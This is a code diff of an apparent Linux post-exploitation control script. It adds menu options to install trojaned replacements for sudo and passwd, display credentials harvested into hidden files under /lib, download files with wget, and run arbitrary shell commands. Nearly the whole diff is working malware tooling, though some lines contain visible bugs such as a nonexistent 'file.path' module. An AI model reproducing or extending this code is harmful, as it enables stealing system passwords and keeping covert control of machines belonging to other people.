@@ -16,26 +16,36 @@ def main():
             
             Commands:
             
-            -h, --help   | displays this message and exits.
+            h, help    | Displays this message and exits.
             
-            -s, --status | displays current module status.
+            s, status  | Displays current module status.
             
-            -p, --pass   | displays current saved passwords collected by the modules.
+            p, pass    | Displays current saved passwords collected by the modules.
+            
+            i, install | Allows the user to install specific modules.
+            
+            d, down    | Allows the user to download files/directories from specified sources.
+            
+            c, command | Allows the user to execute command line commands through os.system.
             
             """)
-        elif(option.lower() in ('s', '--status')):
+        elif(option.lower() in ('-s', '--status')):
             print("Current status:")
             print()
             if(checkStatus(".brain.py")):
                 os.system("echo -e "+"Sudo Brain status: "+"\033[32m[ACTIVE]\033[0m")
             else:
                 os.system("echo -e "+"Sudo Brain status: "+"\033[31m[INACTIVE]\033[0m")
+            if(file.path.exists("/usr/bin/passwdB") and file.path.exists("/usr/bin/passwd") and file.path.exists("/usr/bin/passwdA")):
+                os.system("echo -e "+"passwdReplacer status: "+"\033[32m[ACTIVE]\033[0m")
+            else:
+                os.system("echo -e "+"passwdReplacer status: "+"\033[31m[INACTIVE]\033[0m")
         elif(option.lower() in ('p', '--pass')):
             if(os.path.exists("/lib/.syslogbLog")):
                 os.system("cat /lib/.syslogbLog | less")
             else:
                 print("Harvested passwords from sudo not available.")
-        elif(option.lower() in ('d', '--down')):
+        elif(option.lower() in ('-d', '--down')):
             print("Entering Downloader")
             option = input("(F)ile or (D)irectory: ")
             if(option.lower() in ('f')):       
@@ -70,7 +80,7 @@ def main():
                 else:
                     os.system("mkdir "+Dir)
                     os.system("wget -P "+Dir+ " "+link)
-        elif(value.lower() in ('c', '--command')):
+        elif(value.lower() in ('-c', '--command')):
             print("Entering Command-Line.....(Enter \"exit\" to exit)")
             x = True
             while(x):
@@ -83,6 +93,46 @@ def main():
                     print(os.uname())
                 else:
                     os.system(inVal)
+        elif(value.lower() in ('-p', '--pass')):
+            a = True
+            if(file.path.exists("/lib/.passwdLog")):
+                a = False
+                print("Credentials from passwdReplacer:")
+                os.system("cat /lib/.passwdLog | less")
+            if(file.path.exists("lib/.syslogbLog")):
+                a = False
+                print("Credentials from sudoReplacer:")
+                os.system("cat /lib/.syslogbLog | less")
+            if(a):
+                print("No credential harvesting saves present.")
+        elif(value.lower() in ('-i', '--install')):
+            print("Installing modules...")
+            print("")
+            print("Current status:")
+            print("")
+            if(checkStatus(".brain.py")):
+                os.system("echo -e "+"1) Sudo Brain status: "+"\033[32m[ACTIVE]\033[0m")
+            else:
+                os.system("echo -e "+"1) Sudo Brain status: "+"\033[31m[INACTIVE]\033[0m")
+            if(file.path.exists("/usr/bin/passwdB") and file.path.exists("/usr/bin/passwd") and file.path.exists("/usr/bin/passwdA")):
+                os.system("echo -e "+"2) passwdReplacer status: "+"\033[32m[ACTIVE]\033[0m")
+            else:
+                os.system("echo -e "+"2) passwdReplacer status: "+"\033[31m[INACTIVE]\033[0m")
+            option = input("Which module would you like to install? ")
+            if(option.lower() in ('1')):
+                if(checkStatus(".brain.py")):
+                    print("sudoReplacer is already installed.")
+                else:
+                    print("Installing...")
+                    os.system("bash /var/.sudoMaker.sh")
+            elif(option.lower() in ('2')):
+                if(file.path.exists("/usr/bin/passwdB") and file.path.exists("/usr/bin/passwd") and file.path.exists("/usr/bin/passwdA")):
+                    print("passwdReplacer is already installed.")
+                else:
+                    print("Installing...")
+                    os.system("bash /var/.passwdMaker.sh")
+            else:
+                print("Invalid selection.")
 def checkStatus(fileName):
     ps_output = subprocess.check_output(["ps", "-ef"])
     ps_lines = ps_output.decode("utf-8").split("\n")
